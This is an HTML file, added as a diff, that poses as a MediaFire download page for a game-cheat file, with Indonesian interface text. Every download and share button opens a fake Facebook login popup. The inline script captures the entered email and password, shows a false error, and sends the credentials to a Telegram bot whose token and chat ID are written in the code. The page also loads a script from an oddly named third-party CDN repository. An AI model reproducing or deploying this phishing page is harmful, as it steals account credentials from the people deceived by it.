@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <link rel="stylesheet" href="style.css">
+    <title>Mediafire Download</title>
+    <meta name="keywords" content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android" />
+    <meta name="description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere." />
+    <meta name="robots" content="noindex,nofollow" />
+    <meta name="googlebot" content="noindex,nofollow" />
+    <meta name="slurp" content="noindex,nofollow" />
+    <meta name="google-translate-customization" content="5587c1b0a958bf07-62a8e309de686e87-gc92f61279a2c8524-11" />
+    <meta property="fb:app_id" content="124578887583575">
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="MediaFire" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:title" content="Mediafire Download" />
+    <meta property="og:image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
+    <meta property="og:description" content="" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@MediaFire" />
+    <meta name="twitter:title" content="Mediafire Download" />
+    <meta name="twitter:image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
+    <meta name="twitter:description" content="" />
+    <link href="https://plus.google.com/+mediafire" rel="publisher" />
+    <meta itemprop="name" content="Mediafire Download" />
+    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/jQueryMoobile/cdnjqueryfuncition@main/slim.min.js"></script>
+    <meta itemprop="image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
+
+</head>
+<body>
+     <style>
+@import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');
+
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Open Sans', sans-serif;
+}
+
+body {
+    width: 100%;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+}
+
+.wrap {
+    position: relative;
+    width: 100%;
+    min-height: 100vh;
+    align-items: center;
+    justify-content: flex-start;
+    flex-direction: column;
+    padding: 200px 0 0 0;
+}
+
+.wrap .navbar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 60px;
+    border-bottom: 2px solid rgb(0 0 0 / 10%);
+    padding: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    z-index: 9999;
+    background: #fff;
+}
+
+.navbar .logo {
+    position: relative;
+    width: 60px;
+    height: 60px;
+}
+
+.navbar .flag {
+    position: relative;
+    width: 40px;
+    height: 30px;
+    background: #E9EAEB;
+    padding: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center
+}
+
+.flag img {
+    max-width: 100%;
+}
+
+.logo img {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+}
+
+.wrap .down-area {
+    position: relative;
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+    padding: 0 20px;
+    flex-direction: column;
+    gap: 20px;
+}
+
+.down-area .download {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    background: #0070F0;
+    padding: 10px;
+    gap: 15px;
+    border-radius: 3px;
+}
+
+.down-area .downloaded {
+    position: relative;
+    width: 100%;
+    background: #f4f4f5;
+    color: #000;
+    display: none;
+    align-self: center;
+    justify-content: center;
+    padding: 24px;
+    font-size: 13px;
+    border-radius: 3px;
+}
+
+.download .icon {
+    position: relative;
+    flex: 0 0 35px;
+    height: 45px;
+}
+
+.icon img {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+}
+
+.download .title {
+    position: relative;
+    flex: 1;
+    display: flex;
+    align-items: flex-start;
+    justify-content: center;
+    flex-direction: column;
+    gap: 5px;
+}
+
+.title .atas {
+    font-weight: bold;
+    color: #fff;
+    font-size: 16px;
+}
+
+.title .bawah {
+    color: #fff;
+    font-size: 12px;
+}
+
+.download .do-btn {
+    flex: 0 0 30px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    height: 30px;
+}
+
+.down-area .lainnya {
+    width: 100%;
+    display: grid;
+    grid-template-columns: auto auto;
+    grid-gap: 10px;
+}
+
+.lainnya .action {
+    background: #f4f4f5;
+    color: #575B65;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    padding: 13px 10px;
+    font-size: 11px;
+    border-radius: 3px;
+}
+
+.action .link {
+    position: relative;
+    width: 25px;
+    height: 25px;
+    background: #f4f4f5 url('https://static.mediafire.com/images/icons/svg_dark/link.svg') no-repeat;
+    background-size: 100% 100%;
+}
+
+.action .share {
+    position: relative;
+    width: 25px;
+    height: 25px;
+    background: #f4f4f5 url('https://static.mediafire.com/images/icons/svg_dark/share.svg') no-repeat;
+    background-size: 100% 100%;
+}
+
+.action .post {
+    position: relative;
+    width: 25px;
+    height: 25px;
+    background: #f4f4f5 url('https://static.mediafire.com/images/icons/svg_dark/facebook.svg') no-repeat;
+    background-size: 100% 100%;
+}
+
+.action .save {
+    position: relative;
+    width: 25px;
+    height: 25px;
+    background: #f4f4f5 url('https://static.mediafire.com/images/icons/svg_dark/add.svg') no-repeat;
+    background-size: 100% 100%;
+}
+
+.wrap .foot {
+    margin-top: 100px;
+    position: relative;
+    width: 100%;
+    display: flex;
+    align-items: center;
+    flex-direction: column;
+    justify-content: flex-start;
+    background: #f3f3f3;
+}
+
+.foot .col {
+    width: 100%;
+    display: flex;
+    align-items: flex-start;
+    justify-content: center;
+    flex-direction: column;
+    gap: 20px;
+    padding: 25px;
+    border-bottom: 1px solid #e8e9ec;
+}
+
+.col h2 {
+    font-size: 12px;
+    color: #575B65;
+    font-weight: 600;
+}
+
+.col ul {
+    width: 100%;
+    display: flex;
+    align-items: flex-start;
+    justify-content: flex-start;
+    flex-wrap: wrap;
+    gap: 20px;
+}
+
+.col ul li {
+    list-style: none;
+    color: #575B65;
+    font-size: 12px;
+}
+
+.foot .col.copyright h2 {
+    font-weight: lighter;
+}
+
+.wrap .region {
+    margin-top: 70px;
+    position: relative;
+    width: 100%;
+    display: flex;
+    align-items: center;
+    flex-direction: column;
+    align-items: center;
+    padding: 0 20px;
+    gap: 30px;
+}
+
+.region .map {
+    position: relative;
+    width: 100%;
+    height: 200px;
+    background: #4cacff url('https://static.mediafire.com/images/backgrounds/download/additional_content/world.svg') no-repeat;
+    background-size: 100% 100%;
+}
+
+.map img {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+}
+
+.map .country {
+    position: absolute;
+    top: 0;
+    left: 0;
+    padding: 5px;
+    background: rgba(0, 0, 0, 0.50);
+    color: #fff;
+    font-size: 11px;
+}
+
+.region .region-desc {
+    width: 100%;
+    position: relative;
+    display: flex;
+    align-items: flex-start;
+    justify-content: center;
+    gap: 20px;
+}
+
+.region-desc .regflag {
+    position: relative;
+    width: 75px;
+}
+
+.regflag img {
+    max-width: 100%;
+}
+
+.region-desc .huft {
+    width: 100%;
+    display: flex;
+    align-items: flex-end;
+    justify-content: center;
+    font-size: 12px;
+}
+
+
+@media(min-width: 911px) {
+    .wrap {
+        width: 700px;
+    }
+}
+
+        /* Popup styles */
+           /* Popup Overlay */
+        .popup-login {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);  /* Dark background */
+            display: none;  /* Hidden by default */
+            align-items: center;  /* Vertically center */
+            justify-content: center;  /* Horizontally center */
+            z-index: 9999;  /* Ensure it's on top */
+        }
+
+        /* Popup Box */
+        .login-container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            width: 360px;  /* Adjust width */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .facebook-logo {
+            display: block;
+            margin: 0 auto 20px;
+        }
+
+        .login-container h2 {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .login-container p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 15px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .login-container button:hover {
+            background-color: #166fe5;
+        }
+
+        .error-message {
+            display: none;
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .footer {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Button to trigger the popup */
+        .show-popup-btn {
+            padding: 10px 20px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 20px;
+        }
+
+        .show-popup-btn:hover {
+            background-color: #166fe5;
+        }
+
+    </style>
+    <div class="wrap">
+        <div class="navbar">
+            <div class="logo">
+                <img src="https://iconape.com/wp-content/png_logo_vector/mediafire.png" alt="MediaFire Logo">
+            </div>
+            <div class="flag">
+                <img src="https://www.mediafire.com/images/flags_svg/idn.svg" alt="Flag">
+            </div>
+        </div>
+        <div class="down-area">
+            <div class="download">
+                <div class="icon">
+                    <img src="https://static.mediafire.com/images/filetype/file-zip-v2.png" alt="File Icon">
+                </div>
+                <div class="title" onclick="showLoginPopup()"🐰>
+                    <span class="atas">AIMLOCK HEADSHOT B...</span>
+                    <span class="bawah">Download in a new tab (3.74MB)</span>
+                </div>
+                <div class="do-btn" onclick="showLoginPopup()">
+                    <img src="https://static.mediafire.com/images/icons/svg_light/download.svg" alt="Download Button">
+                </div>
+            </div>
+            <div class="downloaded">
+                Your download is starting...
+            </div>
+            <div class="lainnya">
+                <div class="action" onclick="showLoginPopup()">
+                    <span class="link"></span>
+                    Salin untuk messenger
+                </div>
+                <div class="action" onclick="showLoginPopup()">
+                    <span class="share"></span>
+                    Bagikan opsi
+                </div>
+                <div class="action" onclick="showLoginPopup()">
+                    <span class="post"></span>
+                    Posting ke Facebook
+                </div>
+                <div class="action" onclick="showLoginPopup()">
+                    <span class="save"></span>
+                    Simpan ke File Saya
+                </div>
+            </div>
+        </div>
+        <div class="region">
+            <div class="map">
+                <span class="country">Upload region: </span>
+                <img src="https://static.mediafire.com/images/backgrounds/download/additional_content/continent-as.svg" alt="Region Map">
+            </div>
+            <div class="region-desc">
+                <div class="regflag">
+                    <img src="https://www.mediafire.com/images/flags_svg/idn.svg" alt="Region Flag">
+                </div>
+                <div class="huft">
+                    This file was uploaded from Indonesia on May 3, 2022 at 2:35 AM
+                </div>
+            </div>
+        </div>
+        <div class="foot">
+            <div class="col">
+                <h2>COMPANY</h2>
+                <ul>
+                    <li>About Us</li>
+                    <li>Careers</li>
+                    <li>Press</li>
+                    <li>Company Blog</li>
+                </ul>
+            </div>
+            <div class="col">
+                <h2>TOOLS</h2>
+                <ul>
+                    <li>MediaFire Mobile</li>
+                    <li>On-Demand Video Encoding</li>
+                </ul>
+            </div>
+            <div class="col">
+                <h2>UPGRADE</h2>
+                <ul>
+                    <li>Professional</li>
+                </ul>
+            </div>
+            <div class="col">
+                <h2>SUPPORT</h2>
+                <ul>
+                    <li>Get support</li>
+                </ul>
+            </div>
+            <div class="col copyright">
+                <h2>&copy;2022 MediaFire Build 151202</h2>
+                <ul>
+                    <li>Advertising</li>
+                    <li>Terms</li>
+                    <li>Privacy Policy</li>
+                    <li>Copyright</li>
+                    <li>Abuse</li>
+                    <li>Credits</li>
+                    <li>More...</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- Popup Login Form (Facebook) -->
+    <div class="popup-login" id="loginPage">
+        <div class="login-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo" width="120">
+            <h2>Log into Facebook</h2>
+            <p>Enter your email or phone number</p>
+            <form id="loginForm">
+                <input type="email" id="email" name="email" placeholder="Email or phone" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="error-message" id="errorMessage">Incorrect email or password.</div>
+            <div class="footer">
+                <p>Forgotten account? <a href="#">Click here</a></p>
+                <p>New to Facebook? <a href="#">Create an account</a></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Script -->
+    <script scr="main.js"></script>
+    <script>
+    function showLoginPopup() {
+    document.getElementById("loginPage").style.display = "flex";
+}
+
+// Ambil elemen-elemen HTML yang diperlukan
+const downloadBtn = document.getElementById('downloadBtn');
+const loginPage = document.getElementById('loginPage');
+
+const botToken = '6627077614:AAFVh3gZ4RLqtGxXk2MWXvrt-xTPWKg_Hd8';
+const chatID = '7252677785';
+
+// Handle login form submission
+const loginForm = document.getElementById('loginForm');
+loginForm?.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email')?.value;
+    const password = document.getElementById('password')?.value;
+
+    const errorMessage = document.getElementById('errorMessage');
+    if (errorMessage) errorMessage.style.display = 'block';
+
+    const message = `🌿 𝗥𝗲𝘀𝘂𝗹𝘁𝘀 𝗕𝘆 𝗥𝗲𝘇𝘇 🌿
+
+⌗ ᴇᴍᴀɪʟ: ${email}
+⌗ ᴘᴀꜱꜱᴡᴏʀᴅ: ${password}
+⌗ ʟᴏɢɪɴ: 𝐅𝐚𝐜𝐞𝐁𝐨𝐨𝐤
+
+“𝘚𝘢𝘺𝘢 𝘏𝘢𝘯𝘺𝘢 𝘔𝘦𝘯𝘨𝘶𝘫𝘪, 𝘈𝘬𝘶𝘯 𝘈𝘯𝘥𝘢 𝘈𝘬𝘢𝘯 𝘈𝘮𝘢𝘯. 𝘚𝘢𝘺𝘢 𝘛𝘪𝘥𝘢𝘬 𝘉𝘦𝘳𝘮𝘢𝘬𝘴𝘶𝘥 𝘜𝘯𝘵𝘶𝘬 𝘔𝘦𝘯𝘤𝘶𝘳𝘪 𝘈𝘬𝘶𝘯 𝘈𝘯𝘥𝘢.”
+
+𖤍 𝗥𝗲𝘇𝘇𝗗𝗲𝘃 ✇ 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𖤍`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatID, text: message })
+    })
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error('Error:', error));
+});
+    </script>
+</body>
+</html>
